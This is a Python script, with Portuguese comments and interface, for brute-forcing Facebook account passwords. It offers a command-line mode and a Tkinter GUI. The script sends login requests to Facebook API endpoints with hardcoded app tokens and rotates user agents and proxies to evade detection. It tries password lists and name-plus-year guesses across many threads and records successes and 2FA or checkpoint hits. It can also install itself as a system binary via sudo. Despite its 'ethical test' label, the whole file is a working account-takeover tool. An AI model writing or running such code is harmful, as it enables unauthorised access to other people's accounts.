import requests
import random
import time
import uuid
import json
import re
import logging
import sqlite3
import csv
import os
import sys
import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from collections import deque
import tkinter as tk
from tkinter import filedialog, messagebox
from datetime import datetime

# Verificar e configurar binário na primeira execução
def setup_binary():
    first_run_file = ".first_run"
    if not os.path.exists(first_run_file):
        print("\033[1;97m=== Primeira Execução ===")
        print("\033[1;97mDeseja manter o script como arquivo Python ou criar um binário executável no terminal?")
        print("\033[1;97m1. Manter como arquivo Python")
        print("\033[1;97m2. Criar binário (ex.: executar com 'facebook_brute_test')")
        choice = input("\033[1;97mEscolha (1/2): ")
        
        if choice == "2":
            try:
                print("\033[1;97mInstalando PyInstaller, se necessário...")
                subprocess.run(["pip", "install", "pyinstaller"], check=True)
                
                print("\033[1;97mCompilando script em binário...")
                subprocess.run(["pyinstaller", "--onefile", "--name", "facebook_brute_test", sys.argv[0]], check=True)
                
                binary_path = os.path.join("dist", "facebook_brute_test")
                if not os.path.exists(binary_path):
                    raise FileNotFoundError("Binário não foi criado.")
                
                print("\033[1;97mMovendo binário para /usr/local/bin/ (pode requerer senha de root)...")
                subprocess.run(["sudo", "mv", binary_path, "/usr/local/bin/facebook_brute_test"], check=True)
                subprocess.run(["sudo", "chmod", "+x", "/usr/local/bin/facebook_brute_test"], check=True)
                
                print("\033[1;92mBinário criado! Execute com: facebook_brute_test")
                with open(first_run_file, "w") as f:
                    f.write("completed")
                
                print("\033[1;97mContinuando execução atual como script Python...")
            except subprocess.CalledProcessError as e:
                print(f"\033[1;91m[ERRO] Falha ao criar binário: {e}")
                print("\033[1;97mContinuando como script Python...")
            except FileNotFoundError:
                print("\033[1;91m[ERRO] Binário não encontrado. Verifique o PyInstaller.")
                print("\033[1;97mContinuando como script Python...")
        else:
            print("\033[1;97mMantendo como script Python.")
            with open(first_run_file, "w") as f:
                f.write("completed")

# Configurar parser de argumentos
def setup_argparse():
    parser = argparse.ArgumentParser(description="Teste de Brute Force Ético para Facebook em ambiente controlado")
    parser.add_argument("--gui", action="store_true", help="Iniciar em modo GUI")
    parser.add_argument("--dry-run", action="store_true", help="Executar em modo seco (simulação)")
    parser.add_argument("--tutorial", action="store_true", help="Mostrar tutorial interativo")
    parser.add_argument("--uid", help="IDs da conta (separados por vírgula)")
    parser.add_argument("--password-file", help="Caminho do arquivo de senhas")
    parser.add_argument("--base-name", help="Nome base para senhas personalizadas")
    parser.add_argument("--config", default="config.json", help="Caminho do arquivo de configuração JSON")
    parser.add_argument("--output-dir", default=".", help="Diretório para salvar resultados")
    parser.add_argument("--max-workers", type=int, default=5, help="Número máximo de threads")
    parser.add_argument("--no-validate", action="store_true", help="Desativar validação de senhas")
    return parser.parse_args()

# Configurar logging
def setup_logging(output_dir):
    os.makedirs(output_dir, exist_ok=True)
    logging.basicConfig(
        filename=os.path.join(output_dir, "brute_force.log"),
        level=logging.INFO,
        format="%(asctime)s - %(message)s"
    )

# Lista de User-Agents
user_agents = [
    "Mozilla/5.0 (Linux; Android 10; SM-G960N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36"
]

# Lista de proxies (substitua com proxies reais)
proxies_list = []

# Controle de requisições por minuto
request_times = deque(maxlen=60)

# Inicializar banco de dados SQLite
def init_db(output_dir):
    conn = sqlite3.connect(os.path.join(output_dir, "brute_force.db"))
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS results (uid TEXT, password TEXT, status TEXT, timestamp TEXT)")
    conn.commit()
    return conn

# Carregar configurações de um arquivo JSON
def load_config(config_file):
    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {
            "api_urls": [
                "https://b-graph.facebook.com/auth/login",
                "https://api.facebook.com/auth/login"
            ],
            "user_agents": user_agents,
            "proxies": proxies_list
        }

# Validar força de senha
def check_password_strength(password):
    score = sum([
        len(password) >= 8,
        bool(re.search(r'[A-Z]', password)),
        bool(re.search(r'[0-9]', password)),
        bool(re.search(r'[!@#$%^&*]', password))
    ])
    return score, "Forte" if score >= 3 else "Fraca"

# Gerar senhas personalizadas
def generate_custom_passwords(base_name, years=range(1990, 2026)):
    return [f"{base_name}{year}" for year in years] + [base_name.lower(), base_name.upper()]

# Gerar cabeçalhos HTTP
def generate_headers(config):
    return {
        "User-Agent": random.choice(config["user_agents"]),
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "graph.facebook.com",
        "Accept-Language": random.choice(["en-US", "pt-BR", "es-ES"]),
        "Connection": "keep-alive",
        "X-FB-Connection-Type": "MOBILE.LTE",
        "X-FB-HTTP-Engine": "Liger"
    }

# Gerar dados da requisição
def generate_request_data(uid, password):
    return {
        "adid": str(uuid.uuid4()),
        "email": str(uid),
        "password": str(password),
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "generate_session_cookies": "1",
        "locale": "en_US",
        "client_country_code": "US",
        "method": "auth.login",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d"
    }

# Tentar login
def try_login(uid, password, config, dry_run, output_dir):
    if dry_run:
        return f"[SIMULAÇÃO] {uid} | {password}"
    
    current_time = time()
    request_times.append(current_time)
    if len(request_times) >= 60 and current_time - request_times[0] < 60:
        print("\033[1;91m[AVISO] Limite de requisições atingido. Pausando...")
        time.sleep(60 - (current_time - request_times[0]))
    
    try:
        url = random.choice(config["api_urls"])
        headers = generate_headers(config)
        data = generate_request_data(uid, password)
        proxy = random.choice(config["proxies"]) if config["proxies"] else None
        session = requests.session()
        if proxy:
            session.proxies.update(proxy)
        
        logging.info(f"Tentando {uid} | {password} | URL: {url}")
        response = session.post(url, data=data, headers=headers, allow_redirects=False, verify=True).json()
        
        if "error" in response:
            logging.info(f"Código de erro: {response['error'].get('code')} | Mensagem: {response['error'].get('message')}")
        
        if "session_key" in response:
            result = f"[SUCESSO] {uid} | {password}"
        elif "www.facebook.com" in response.get("error", {}).get("message", ""):
            result = f"[CHECKPOINT] {uid} | {password} (Autenticação adicional necessária)"
        elif "two_factor" in response.get("error", {}).get("message", "").lower():
            result = f"[2FA] {uid} | {password} (Autenticação de dois fatores ativada)"
        elif "captcha" in response.get("error", {}).get("message", "").lower():
            result = f"[CAPTCHA] {uid} | {password} (CAPTCHA solicitado)"
        elif "temporary block" in response.get("error", {}).get("message", "").lower():
            print("\033[1;91m[AVISO] Conta temporariamente bloqueada. Pausando por 5 minutos...")
            time.sleep(300)
            return None
        else:
            return None
        
        save_result(result, output_dir)
        save_to_db(uid, password, result.split("]")[0][1:], output_dir)
        return result
    except Exception as e:
        result = f"[ERRO] {uid} | {password} | {str(e)}"
        logging.error(result)
        save_result(result, output_dir)
        save_to_db(uid, password, "ERRO", output_dir)
        return result

# Salvar resultado em arquivo
def save_result(result, output_dir):
    with open(os.path.join(output_dir, "results.txt"), "a") as f:
        f.write(result + "\n")

# Salvar resultado em banco de dados
def save_to_db(uid, password, status, output_dir):
    conn = init_db(output_dir)
    c = conn.cursor()
    c.execute("INSERT INTO results VALUES (?, ?, ?, ?)", (uid, password, status, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# Exportar para CSV
def save_to_csv(results, output_dir):
    with open(os.path.join(output_dir, "results.csv"), "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Status", "UID", "Password", "Timestamp"])
        for result in results:
            status = result.split("]")[0][1:]
            uid, pw = result.split(" | ")[:2]
            writer.writerow([status, uid, pw, datetime.now().isoformat()])

# Tutorial interativo
def run_tutorial():
    print("\033[1;97m=== Tutorial de Brute Force Ético ===")
    print("1. Um User-Agent simula um navegador ou dispositivo para evitar detecção.")
    print("2. A API do Facebook autentica com base em ID e senha via requisições POST.")
    print("3. Proxies e delays ajudam a simular comportamento humano.")
    print("4. Senhas fortes e 2FA protegem contra brute force.")
    input("\033[1;97mPressione Enter para continuar...")

# Validar senhas
def validate_passwords(passwords, no_validate):
    if no_validate:
        print("\033[1;97mValidação de senhas desativada.")
        return
    print("\n\033[1;97m=== Validação de Senhas ===")
    for pw in passwords:
        score, strength = check_password_strength(pw)
        print(f"\033[1;97mSenha: {pw} | Força: {strength} (Pontuação: {score}/4)")

# Testar um UID
def test_uid(uid, passwords, config, dry_run, max_workers, output_dir):
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(try_login, uid, pw, config, dry_run, output_dir) for pw in passwords]
        for future in tqdm(futures, desc=f"Testando {uid}", unit="senha"):
            result = future.result()
            if result:
                results.append(result)
            time.sleep(random.uniform(0.5, 1.5))
    return results

# Função principal CLI
def main(args):
    setup_logging(args.output_dir)
    config = load_config(args.config)
    
    if args.tutorial:
        run_tutorial()
    
    dry_run = args.dry_run
    uids = args.uid.split(",") if args.uid else input("\033[1;97mDigite os IDs (separados por vírgula): ").split(",")
    password_file = args.password_file if args.password_file else input("\033[1;97mDigite o caminho do arquivo de senhas (ou Enter para padrão): ")
    base_name = args.base_name if args.base_name else input("\033[1;97mDigite um nome base para senhas personalizadas (ou Enter para ignorar): ")
    
    if password_file:
        try:
            with open(password_file, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print("\033[1;91m[ERRO] Arquivo não encontrado. Usando senhas padrão.")
            passwords = ["123456", "password", "qwerty123", "letmein"]
    else:
        passwords = ["123456", "password", "qwerty123", "letmein"]
    
    if base_name:
        passwords.extend(generate_custom_passwords(base_name))
    
    validate_passwords(passwords, args.no_validate)
    
    start_time = time.time()
    all_results = []
    for uid in uids:
        uid = uid.strip()
        results = test_uid(uid, passwords, config, dry_run, args.max_workers, args.output_dir)
        all_results.extend(results)
    
    end_time = time.time()
    report = {
        "total_time": f"{end_time - start_time:.2f} seconds",
        "attempts": len(passwords) * len(uids),
        "successes": sum("SUCESSO" in r for r in all_results),
        "checkpoints": sum("CHECKPOINT" in r for r in all_results),
        "errors": sum("ERRO" in r for r in all_results)
    }
    with open(os.path.join(args.output_dir, "report.json"), "w") as f:
        json.dump(report, f, indent=4)
    save_to_csv(all_results, args.output_dir)
    
    print("\n\033[1;97m=== Resultados ===")
    if all_results:
        for result in all_results:
            print(f"\033[1;92m{result}")
    else:
        print("\033[1;91mNenhuma senha válida encontrada.")
    print(f"\033[1;97mRelatório salvo em {os.path.join(args.output_dir, 'report.json')} e {os.path.join(args.output_dir, 'results.csv')}")

# Interface gráfica
def main_gui(args):
    setup_logging(args.output_dir)
    config = load_config(args.config)
    
    def browse_file():
        filename = filedialog.askopenfilename()
        entry_file.delete(0, tk.END)
        entry_file.insert(0, filename)
    
    def start_test():
        uids = entry_uid.get().split(",")
        password_file = entry_file.get()
        base_name = entry_base.get()
        dry_run = var_dry.get()
        
        passwords = ["123456", "password", "qwerty123", "letmein"]
        if password_file:
            try:
                with open(password_file, "r") as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                messagebox.showerror("Erro", "Arquivo de senhas não encontrado.")
                return
        
        if base_name:
            passwords.extend(generate_custom_passwords(base_name))
        
        validate_passwords(passwords, args.no_validate)
        all_results = []
        for uid in uids:
            uid = uid.strip()
            results = test_uid(uid, passwords, config, dry_run, args.max_workers, args.output_dir)
            all_results.extend(results)
        
        save_to_csv(all_results, args.output_dir)
        text_results.delete(1.0, tk.END)
        for result in all_results:
            text_results.insert(tk.END, result + "\n")
        messagebox.showinfo("Concluído", f"Teste finalizado. Resultados salvos em {args.output_dir}.")
    
    root = tk.Tk()
    root.title("Teste de Brute Force Ético")
    
    tk.Label(root, text="ID(s) da Conta (separados por vírgula):").grid(row=0, column=0, padx=5, pady=5)
    entry_uid = tk.Entry(root, width=50)
    entry_uid.insert(0, args.uid if args.uid else "")
    entry_uid.grid(row=0, column=1, padx=5, pady=5)
    
    tk.Label(root, text="Arquivo de Senhas:").grid(row=1, column=0, padx=5, pady=5)
    entry_file = tk.Entry(root, width=50)
    entry_file.insert(0, args.password_file if args.password_file else "")
    entry_file.grid(row=1, column=1, padx=5, pady=5)
    tk.Button(root, text="Selecionar", command=browse_file).grid(row=1, column=2, padx=5, pady=5)
    
    tk.Label(root, text="Nome Base para Senhas Personalizadas:").grid(row=2, column=0, padx=5, pady=5)
    entry_base = tk.Entry(root, width=50)
    entry_base.insert(0, args.base_name if args.base_name else "")
    entry_base.grid(row=2, column=1, padx=5, pady=5)
    
    var_dry = tk.BooleanVar(value=args.dry_run)
    tk.Checkbutton(root, text="Modo Seco (Simulação)", variable=var_dry).grid(row=3, column=1, padx=5, pady=5)
    
    tk.Button(root, text="Iniciar Teste", command=start_test).grid(row=4, column=1, padx=5, pady=5)
    
    text_results = tk.Text(root, height=10, width=60)
    text_results.grid(row=5, column=0, columnspan=3, padx=5, pady=5)
    
    root.mainloop()

if __name__ == "__main__":
    setup_binary()
    args = setup_argparse()
    if args.gui:
        main_gui(args)
    else:
        main(args)